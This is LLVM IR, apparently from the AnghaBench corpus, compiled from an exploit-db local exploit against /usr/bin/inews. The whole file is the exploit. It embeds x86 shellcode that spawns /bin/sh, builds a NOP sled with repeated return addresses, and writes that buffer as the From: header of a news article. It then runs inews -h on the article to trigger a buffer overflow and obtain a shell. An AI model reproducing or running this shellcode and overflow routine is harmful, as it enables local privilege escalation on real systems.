; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19480.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19480.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.execshell = private unnamed_addr constant [51 x i8] c"\EB$^\8D\1E\89^\0B3\D2\89V\07\89V\0F\B8\1BV4\125\10V4\12\8DN\0B\8B\D1\CD\803\C0@\CD\80\E8\D7\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [21 x i8] c"malloc isnt working\0A\00", align 1
@BUFFER_SIZE = common dso_local global i32 0, align 4
@RET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [6 x i8] c"filez\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.3 = private unnamed_addr constant [51 x i8] c"From: %s\0ASubject: y0\0ANewsgroups: yaya le chat\0A\0A\0A\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"/usr/bin/inews\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"inews\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"Couldnt open file : filez\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca [51 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  store i8* null, i8** %8, align 8
  %11 = bitcast [51 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.main.execshell, i32 0, i32 0), i64 51, i1 false)
  %12 = load i32, i32* %4, align 4
  %13 = icmp sgt i32 %12, 1
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  store i32 %18, i32* %7, align 4
  br label %19

19:                                               ; preds = %14, %2
  %20 = call i8* @malloc(i32 1024)
  store i8* %20, i8** %8, align 8
  %21 = load i8*, i8** %8, align 8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %26, label %23

23:                                               ; preds = %19
  %24 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %25 = call i32 @exit(i32 0) #4
  unreachable

26:                                               ; preds = %19
  %27 = load i8*, i8** %8, align 8
  %28 = load i32, i32* @BUFFER_SIZE, align 4
  %29 = call i32 @memset(i8* %27, i32 144, i32 %28)
  store i32 100, i32* %9, align 4
  br label %30

30:                                               ; preds = %45, %26
  %31 = load i32, i32* %9, align 4
  %32 = load i32, i32* @BUFFER_SIZE, align 4
  %33 = sub nsw i32 %32, 4
  %34 = icmp slt i32 %31, %33
  br i1 %34, label %35, label %48

35:                                               ; preds = %30
  %36 = load i32, i32* @RET, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %36, %37
  %39 = sext i32 %38 to i64
  %40 = load i8*, i8** %8, align 8
  %41 = load i32, i32* %9, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = bitcast i8* %43 to i64*
  store i64 %39, i64* %44, align 8
  br label %45

45:                                               ; preds = %35
  %46 = load i32, i32* %9, align 4
  %47 = add nsw i32 %46, 4
  store i32 %47, i32* %9, align 4
  br label %30

48:                                               ; preds = %30
  %49 = load i8*, i8** %8, align 8
  %50 = getelementptr inbounds [51 x i8], [51 x i8]* %10, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = sub nsw i32 100, %51
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %49, i64 %53
  %55 = getelementptr inbounds [51 x i8], [51 x i8]* %10, i64 0, i64 0
  %56 = getelementptr inbounds [51 x i8], [51 x i8]* %10, i64 0, i64 0
  %57 = call i32 @strlen(i8* %56)
  %58 = call i32 @memcpy(i8* %54, i8* %55, i32 %57)
  %59 = call i32* @fopen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %59, i32** %6, align 8
  %60 = icmp ne i32* %59, null
  br i1 %60, label %61, label %68

61:                                               ; preds = %48
  %62 = load i32*, i32** %6, align 8
  %63 = load i8*, i8** %8, align 8
  %64 = call i32 @fprintf(i32* %62, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.3, i64 0, i64 0), i8* %63)
  %65 = load i32*, i32** %6, align 8
  %66 = call i32 @fclose(i32* %65)
  %67 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i32* null)
  br label %71

68:                                               ; preds = %48
  %69 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  %70 = call i32 @exit(i32 0) #4
  unreachable

71:                                               ; preds = %61
  %72 = load i32, i32* %3, align 4
  ret i32 %72
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
